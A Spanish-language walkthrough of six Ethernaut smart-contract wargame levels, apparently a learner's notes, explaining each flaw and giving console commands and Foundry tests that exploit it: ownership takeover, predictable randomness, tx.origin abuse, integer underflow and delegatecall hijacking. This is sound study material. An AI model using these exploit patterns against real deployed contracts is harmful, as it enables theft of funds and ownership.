#1 Fallback

Es un contrato simple para contribuir, y al mayor contributor le dan el owner (si llama la funcion contribute) pero a cualquier address que transfiera al menos 1 wei y ya tenga al menos 1 wei contribuido a traves de la funcion `contribute()`, se le da el owner si hace un transfer directo. 

```solidity
    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
```

para pasar el nivel simplemente corre los sigueintes comandos por la consola: 

```bash
await contract.contribute({value: 1})
await  web3.eth.sendTransaction({
  from: player,
  to: contract.address,
  value: 1
})
```

#2 Fallout 

Es una copia del caso de Dynamic Pyramid, que era una compania que se renombro a rubixi, pero se les olbido cambiar el nombre del constructor, entonces cualquiera podia llamar al constructor viejo y reclamar el ownership.

para pasar el nivel simplemente corre los sigueintes comandos por la consola: 

```bash
await contract.Fal1out()
```

#3 Coinflip

Contrato que quiere hacer aleatorio, pero no lo logra, ya que usa en hasheo basico del block.number - 1 

```solidity
uint256 blockValue = uint256(blockhash(block.number - 1));
```

por lo tanto es predecible.

a continunacion hay un test simulando el ataque, para ganar mas de 10 veces: 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {CoinFlip} from "src/CoinFlip.sol";
import {Test} from "forge-std/Test.sol";

contract DelegationTest is Test {

    CoinFlip coinFlipContract;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    function setUp() external {
        coinFlipContract = new CoinFlip();
    }

    function test_3_coinflip() external {
        for(uint256 i = 0; i < 10; i++) {
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;

            coinFlipContract.flip(side);

            vm.roll(block.number + 1);
            vm.warp(block.timestamp + 12);
        }

        assert(coinFlipContract.consecutiveWins() >= 10);
    }


}
```

#4 Telephone

contrato que llamando a la funcion changeOwner, simepre y cunado el caller sea un contrato, osea `tx.origin != msg.sender``, le da el owner al sender.

a continunacion hay un test simulando el ataque, para ganar mas de 10 veces: 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Telephone} from "src/Telephone.sol";
import {Test} from "forge-std/Test.sol";

contract TelephoneTest is Test {

    Telephone telephone;
    Caller caller;

    address newOwner = makeAddr("newOwner");
    function setUp() external {
        telephone = new Telephone();
        caller = new Caller(address(telephone));
    }

    function test_telephone_4_ethernaut() external {
        caller.attack(newOwner);
        assertEq(telephone.owner(), newOwner);
    }

}

contract Caller {
    Telephone telephone;
    constructor(address telephone_) {
        telephone = Telephone(telephone_);
    }

    function attack(address newOwner_) external {
        telephone.changeOwner(newOwner_);
    }
}
```

#5 Token 

Contrato basico, empezamos con 20 tokens, la version es 0.6.0, por lo que no tiene el overflow check, por tanto, el checkeo que hace de `require(balances[msg.sender] - _value >= 0);`, si el value es mayor al balance del usuario, por ejemplo `21` empieza de atras para delante por tanto seria `type(uint256).max` ya que los uint256 no pueden ser negativos, entonces se le retaria al sender 21 y al restarsele 21 le qued aese valor mas grande, al to si se le sumaria el valor de _value.

a continuacion dejo la manera de explotarlo: 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Token} from "src/Token.sol";
import {Test} from "forge-std/Test.sol";

contract TelephoneTest is Test {

    Token token;

    address newOwner = makeAddr("newOwner");
    function setUp() external {
        token = new Token(20);
    }

    function test_token_5_ethernaut() external {
        assert(token.balanceOf(address(this)) == 20);
        token.transfer(address(this), 21);
        assert(token.balanceOf(address(this)) > 20);
    }

}
```

#6 Delegation

El objetivo es reclamar el ownership del contrato, el contrato al recibir eth directamente (en el fallback), hace un delegate call al contrato delegate, a la msg.data especificada en el call, si le pasas Delegate.pwn.selector, la funcion pwn le da el ownership al sender, delegate call ejecuta la funcion de el contrato target pero en el contexto de este contrato, por tanto enviando ether, con la msg.data apuntando a la funcion pwn del contrato Delegeta, nos da el ownership del contrato Delegation. 

a continuacion dejo la manera de explotarlo: 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Delegation,Delegate} from "src/Delegation.sol";
import {Test} from "forge-std/Test.sol";

contract DelegationTest is Test {

    Delegation delegation;
    Delegate delegate;

    address initialOwner = makeAddr("initialOwner");
    address newOwner = makeAddr("newOwner");
    function setUp() external {
        delegate = new Delegate(initialOwner);
        delegation = new Delegation(address(delegate));
    }

    function test_6_delegation() external {
        address(delegation).call{value: 1}(abi.encodeWithSelector(Delegate.pwn.selector));
        assertEq(delegation.owner(), address(this));
    }


}
```
